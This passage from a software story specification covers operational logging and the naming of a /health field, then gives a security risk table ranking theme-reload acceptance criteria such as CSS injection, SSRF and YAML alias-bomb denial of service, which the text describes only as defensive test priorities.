- **SRE/Ops perspective (found via stakeholder-round-table elicitation):** An operator watching `GET /health`'s new `themesFailed` count (AC-9) over time has no way to distinguish "one theme has always failed since a typo three months ago" from "a theme just started failing this reload." This story does not need to solve alerting/trending (that's an operator's own monitoring stack's job, consuming `/health` or the audit log), but the operational log line above should include enough detail (failed filenames, at `info` level, server-side only — never on `/health` per AC-9's edge case) that a human correlating a `/health` count change with server logs can immediately identify which file changed state, without needing to diff two `/health` snapshots. No new AC — this is satisfied by the existing operational log line already specified above as long as it lists filenames, not just the count.
- **Health field naming (AC-9):** This AC is explicitly called out as a judgment call, not a literal epics.md requirement. If a reviewer decides this is unnecessary scope creep for a first story in the epic, it can be cut without invalidating any other AC — but its inclusion is recommended because it mirrors an already-shipped, already-reviewed precedent (14.2's `extensions_status`) exactly, and gives this "invisible" API-only story at least one small, low-risk, publicly-observable signal.

### Security Risk Summary (added via risk-categorization elicitation)

Prioritization for code review and test-coverage investment — not all ACs carry equal risk:

| AC | Risk | Severity | Why |
|----|------|----------|-----|
| AC-4 | CSS injection via token values | **Critical** | Direct XSS-adjacent exfiltration path against a credentials-manager UI (architecture.md line 515); explicitly named the story's "single most security-critical AC" |
| AC-5 | SSRF via theme asset URLs | **Critical** | Cloud-metadata/internal-network exposure to every browser that loads the theme; same blocklist class as an already-hardened webhook surface |
| AC-10 | Resource exhaustion (YAML alias bomb, oversized file) | **High** | Process-wide DoS blast radius (crashes/degrades the API for every org on the instance), not scoped to one theme or one admin — newly identified via this elicitation pass, not in the original epics.md text |
| AC-3 | Malformed-file isolation | Medium | Availability/correctness risk (one bad file blocking others), not a direct security exploit |
| AC-6 | Fallback-to-base-theme | Medium | Correctness/UX risk if fallback doesn't trigger — a broken theme is a usability regression, not itself an exploit, though a *failed* fallback could leave AC-4/AC-5's rejected content half-applied |
| AC-7/AC-8 | Audit trail completeness | Medium | Compliance/forensics risk if reload actions aren't traceable, not an active exploit path |
| AC-9 | `/health` field leakage | Low | Information-disclosure risk is explicitly bounded (counts only, no filenames/reasons on the public endpoint) |

Test-writing priority should follow this table top-to-bottom: AC-4 and AC-5's adversarial-payload tests are non-negotiable; AC-10's alias-bomb and oversized-file tests are the next tier and must not be treated as optional polish given the process-wide blast radius.
